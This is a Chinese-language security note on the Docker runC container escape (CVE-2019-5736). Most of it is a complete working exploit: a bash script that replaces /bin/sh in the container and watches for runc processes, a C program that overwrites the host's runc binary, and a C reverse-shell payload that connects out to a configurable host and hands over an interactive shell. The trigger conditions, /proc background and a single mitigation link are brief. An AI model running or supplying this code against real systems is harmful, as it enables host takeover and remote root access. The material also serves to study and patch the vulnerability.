# Docker基于runC逃逸漏洞

## 触发条件

通过`docker exec -it <CONTAINER ID> /bin/bash`进入容器执行`/bin/bash`文件，将其覆盖为`#!/proc/self/exe`。

添加可执行权限。

!!! danger "触发条件"
    容器中的进程以 {==root==} 权限运行。

## proc

系统自动将进程信息挂载到`/proc`。

进程在访问`/proc/self`时，相当于访问`/proc/[pid]`，pid为自己。

- `/proc/[pid]/exe`执行命令的实际路径，可通过该命令拷贝进程。
- `/proc/[pid]/fd`包含该进程打开的每个文件的句柄。

!!! quote
    proc(5): <http://man7.org/linux/man-pages/man5/proc.5.html>

## exploit代码

<https://github.com/feexd/pocs/tree/master/CVE-2019-5736>

Edit HOST inside `payload.c`, compile with `make`. Start `nc` and run `pwn.sh` inside the container.

!!! danger "使用前请备份"
    - 该exploit会修改host上的`/usr/bin/docker-runc`
    - 该exploit会修改容器中的`/bin/sh`

```bash tab="pwn.sh"
#!/bin/bash

function pwn() {
    # 将容器中的/bin/sh篡改为/proc/self/exe并添加可执行权限
    echo '#!/proc/self/exe' > /bin/sh
    chmod +x /bin/sh

    while true; do  # 监听含有runc命令参数的程序启动
        for f in /proc/*/exe; do
            tmp=${f%/*}  # 去掉/exe
            pid=${tmp##*/}  # 去掉/proc/
            cmdline=$(cat /proc/${pid}/cmdline)  # 获取进程命令参数

            if [[ -z ${cmdline} ]] || [[ ${cmdline} == *runc* ]]; then
                echo starting exploit
                ./exploit /proc/${pid}/exe
            fi
        done
    done
}

exec 2>/dev/null
pwn
```

```c tab="exploit.c"
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>

#define PAYLOAD_MAX_SIZE 1048576
#define O_PATH 010000000
#define SELF_FD_FMT "/proc/self/fd/%d"

int main(int argc, char **argv) {
    int fd, ret;
	char *payload, dest[512];

    if (argc < 2) {
        printf("usage: %s FILE\n", argv[0]);
        return 1;
    }

    payload = malloc(PAYLOAD_MAX_SIZE);
    if (payload == NULL) {
        puts("Could not allocate memory for payload.");
        return 2;
    }

    //读取payload文件内容
    FILE *f = fopen("./payload", "r");
    if (f == NULL) {
        puts("Could not read payload file.\n");
        return 3;
    }
    int payload_sz = fread(payload, 1, PAYLOAD_MAX_SIZE, f);

    for (;;) {
        fd = open(argv[1], O_PATH);  //写入到/proc/{pid}/exe
        if (fd >= 0) {
            printf("Successfuly opened %s at fd %d\n", argv[1], fd);
            snprintf(dest, 500, SELF_FD_FMT, fd);
            puts(dest);
            for (int i = 0; i < 9999999; i++) {
                fd = open(dest, O_WRONLY | O_TRUNC);
                if (fd >= 0) {
                    printf("Successfully openned runc binary as WRONLY\n");
                    ret = write(fd, payload, payload_sz);
                    if (ret > 0) printf("Payload deployed\n");
                    break;
                }
            }
            break;
        }
    }
    return 0;
}
```

```c tab="payload.c"
#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>

#define HOST "127.0.0.1"
#define PORT 4455

int main (int argc, char **argv) {
  int scktd;
  struct sockaddr_in client;

  client.sin_family = AF_INET;
  client.sin_addr.s_addr = inet_addr(HOST);
  client.sin_port = htons(4455);

  scktd = socket(AF_INET,SOCK_STREAM,0);
  connect(scktd,(struct sockaddr *)&client,sizeof(client));

  dup2(scktd,0); // STDIN
  dup2(scktd,1); // STDOUT
  dup2(scktd,2); // STDERR

  execl("/bin/sh","sh","-i",NULL,NULL);

  return 0;
}
```

## 消减措施

- kubernetes: <https://kubernetes.io/blog/2019/02/11/runc-and-cve-2019-5736/>


!!! quote "参考链接"
    - Go语言POC：<https://github.com/Frichetten/CVE-2019-5736-PoC>
    - 容器镜像：<https://github.com/q3k/cve-2019-5736-poc>
    - touch文件POC：<https://x3fwy.bitcron.com/post/runc-malicious-container-escape>
    - 嘶吼：<https://www.4hou.com/vulnerable/16243.html>
